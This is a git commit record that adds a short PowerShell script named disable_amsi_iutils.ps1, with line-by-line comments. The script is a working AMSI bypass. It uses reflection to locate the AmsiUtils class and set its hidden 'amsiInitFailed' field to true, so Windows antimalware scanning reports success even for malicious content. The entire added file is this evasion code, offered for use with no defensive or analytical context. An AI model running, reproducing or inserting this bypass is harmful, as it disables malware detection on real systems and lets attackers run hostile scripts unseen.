5247edc4df088a6e980451f18145413c7c020c94
otter <1riccardo.miani@gmail.com>
2023-08-15 10:39:50 +0200

    added disable_amsi_iutils.ps1

---
+++ scripts/disable_amsi_iutils.ps1
@@ -0,0 +1,11 @@
+# gets all types defined in the current assembly at runtime
+$a = [Ref].Assembly.GetTypes()
+# iterates over types and checks if name contains "iUtils"
+ForEach($b in $a) {if ($b.Name -like '*iUtils') {$c = $b}}
+# if so gets all the fields defined in the type
+$d = $c.GetFields('NonPublic,Static')
+# iterates over fields and checks if name contains "Failed"
+ForEach($e in $d) {if ($e.Name -like '*Failed') {$f = $e}}
+# if so sets value to True disabling AMSI
+# the AMSI API still returns a success even if content is malicious
+$f.SetValue($null,$true)
